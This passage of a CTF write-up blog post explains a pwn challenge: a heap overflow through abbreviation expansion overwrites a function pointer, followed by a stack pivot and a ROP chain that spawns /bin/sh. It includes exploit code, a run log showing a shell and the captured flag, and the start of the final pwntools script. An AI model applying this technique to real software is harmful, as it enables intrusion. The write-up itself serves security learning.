-  <span class="n">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>
-
-  <span class="n">Translator</span> <span class="o">*</span><span class="n">t</span> <span class="o">=</span> <span class="n">translator_new</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
-  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-    <span class="cm">/* Input data */</span>
-    <span class="n">translator_reset</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter text: &#34;</span><span class="p">);</span>
-    <span class="n">fgets</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span>
-      <span class="k">break</span><span class="p">;</span>
-
-    <span class="cm">/* Expand abbreviation */</span>
-    <span class="n">t</span><span class="o">-&gt;</span><span class="n">translate</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Result: %s&#34;</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
-  <span class="p">}</span>
-
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div><p>The <code>rules.h</code> looks like this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span> <span class="c1">// abbreviated string (i.e &#34;asap&#34;)
-</span><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span> <span class="c1">// expanded string (i.e &#34;as soon as possible&#34;)
-</span><span class="c1"></span><span class="p">}</span> <span class="n">Rule</span><span class="p">;</span>
-
-<span class="c1">// Why are there so many abbreviations in English!!?? :exploding_head:
-</span><span class="c1"></span><span class="n">Rule</span> <span class="n">rules</span><span class="p">[]</span> <span class="o">=</span>
-  <span class="p">{</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;2f4u&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;too fast for you&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;4yeo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your eyes only&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fyeo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your eyes only&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aamof&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;as a matter of fact&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;afaik&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;as far as i know&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;afk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;away from keyboard&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aka&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;also known as&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;b2k&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to keyboard&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to keyboard&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to topic&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;by the way&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;b/c&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;because&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;c&amp;p&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;copy and paste&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;cys&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;check your settings&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;diy&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;do it yourself&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;eobd&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;end of business day&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;faq&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;frequently asked questions&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fka&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;formerly known as&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fwiw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for what it&#39;s worth&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fyi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your information&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;jfyi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;just for your information&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;hf&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;have fun&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;hth&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;hope this helps&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;idk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;i don&#39;t know&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;iirc&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;if i remember correctly&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imho&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my humble opinion&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my opinion&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imnsho&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my not so humble opinion&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;iow&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in other words&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;itt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in this thread&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;dgmw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;don&#39;t get me wrong&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;mmw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;mark my words&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;nntr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;no need to reply&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;noob&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;newbie&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;noyb&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;none of your business&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;nrn&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;no reply necessary&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;otoh&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;on the other hand&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;rtfm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;read the fine manual&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;scnr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;sorry, could not resist&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;sflr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;sorry for late reply&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tba&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;to be announced&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tbc&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;to be continued&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tia&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thanks in advance&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tq&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thank you&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tyvm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thank you very much&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tyt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;take your time&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ttyl&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;talk to you later&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wfm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;works for me&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wtf&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;what the fuck&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wrt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;with regard to&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ymmd&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;you made my day&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;icymi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in case you missed it&#34;</span><span class="p">},</span>
-   <span class="c1">// pwners abbreviations
-</span><span class="c1"></span>   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;rop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;return oriented programming &#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;jop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;jump oriented programming &#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;cop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;call oriented programming &#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aar&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;arbitrary address read&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aaw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;arbitrary address write&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;www&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;write what where&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;oob&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;out of bounds&#34;</span><span class="p">},</span>
-   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ret2&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;return to &#34;</span><span class="p">},</span>
-  <span class="p">};</span>
-</code></pre></div><p>The main stuff is in <code>english_expand</code> function which is looking for an abreviation in the user input. If it finds the abbreviation, all the data after the occurence will be written further according to the length of the full expression.
-The attack idea is fairly simple, the <code>text</code> variable is allocated right before the <code>Translator</code> structure, and so in the heap they will be contiguous. Given that, we know that if we send 0x1000 bytes in the chunk contained by <code>text</code> and that we put an abbreviation of the right length we can overwrite the <code>translate</code> function pointer.</p>
-<p>I will not describe in details how we can find the right size for the abbreviation or the length off the necessary padding.
-An interesting abbreviation is the <code>www</code>, which stands for &ldquo;write what where&rdquo; (what a nice abbreviation for a pwner lmao), indeed the expanded expression has a length of 16 bytes.
-So we send <code>b&quot;wwwwww&quot; + b&quot;A&quot;*(0x1000-16) + pwn.p64(gadget)</code>, we will overflow the 32 first bytes next the <code>text</code> chunk, and in this rewrite the <code>translator</code> function pointer.</p>
-<div class="gblog-post__anchorwrap">
-    <h2 id="ropchain-1">
-        ROPchain
-        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#ropchain-1" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain-1">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<p>Once that&rsquo;s done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.
-Lets take a look at the values of the registers when we trigger the function pointer:</p>
-<pre tabindex="0"><code> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
- RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0
- RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
-*RDX  0x405121 (_nl_load_domain+737) ◂— xchg   eax, esp
- RDI  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
- RSI  0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* '\n' */
- R8   0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
- R9   0x0
- R10  0x49e522 ◂— 'Enter text: '
- R11  0x246
- R12  0x4030e0 (__libc_csu_fini) ◂— endbr64 
- R13  0x0
- R14  0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 
- R15  0x0
- RBP  0x7ffdef1b8230 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 
- RSP  0x7ffdef1b8220 ◂— 0x0
- RIP  0x402036 (main+190) ◂— call   rdx
-</code></pre><p><code>$rax</code> points to the newly readen input, same for <code>$r8</code> and <code>$rdi</code> and <code>$rdx</code> contains the location to which we will jmp on.
-So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</code>, <code>mov rsp, r8</code> and so on. But I didn&rsquo;t find any gadgets like that, so I looked for <code>xchg rsp</code> gadgets, and I finally found a <code>xchg eax, esp</code> gadgets ! Since the binary is not PIE based, the heap addresses fit into a 32 bits register, so that&rsquo;s perfect!</p>
-<p>Now we can make <code>$rsp</code> to point to the user input, we make a similar ropchain as the last challenge, and that&rsquo;s enough to get a shell!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
-<span class="c1"># 0x00000000004126e3 : call qword ptr [rax]</span>
-<span class="c1"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
-<span class="c1"># 0x0000000000405121 : xchg eax, esp ; ret</span>
-
-<span class="n">pld</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;wwwwww&#34;</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000405121</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>
-
-<span class="c1"># 0x000000000045a8f7 : pop rax ; ret</span>
-<span class="c1"># 0x0000000000404cfe : pop rsi ; ret</span>
-<span class="c1"># 0x00000000004018da : pop rdi ; ret</span>
-<span class="c1"># 0x00000000004017df : pop rdx ; ret</span>
-<span class="c1"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span>
-
-<span class="n">DATA_SEC</span> <span class="o">=</span> <span class="mh">0x0000000004c90e0</span>
-<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x00000000004018da</span>
-<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x0000000000404cfe</span>
-<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x000000000045a8f7</span>
-<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x00000000004017df</span>
-<span class="n">MOV_PTR_RDI_RSI</span> <span class="o">=</span> <span class="mh">0x000000000045684f</span>
-<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004012e3</span> <span class="c1"># syscall</span>
-
-<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DATA_SEC</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_PTR_RDI_RSI</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
-<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
-</code></pre></div><p>We launch the script with the right arguments and we correctly pop a shell!</p>
-<pre tabindex="0"><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
-[*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-[+] Opening connection to 168.119.108.148 on port 10010: Done
-/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
-  res = self.recvuntil(delim, timeout=timeout)
-[*] Switching to interactive mode
-$ id
-uid=999(pwn) gid=999(pwn) groups=999(pwn)
-$ ls
-chall
-flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
-$ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
-ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
-</code></pre><div class="gblog-post__anchorwrap">
-    <h2 id="final-exploit">
-        Final exploit
-        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
-<span class="c1"># -*- coding: utf-8 -*-</span>
-
-<span class="c1"># this exploit was generated via</span>
-<span class="c1"># 1) pwntools</span>
-<span class="c1"># 2) ctfinit</span>
-
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">pwn</span>
-
-
-<span class="c1"># Set up pwntools for the correct architecture</span>
-<span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;abbr&#39;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
-
-<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
-<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">io</span>
-
-<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
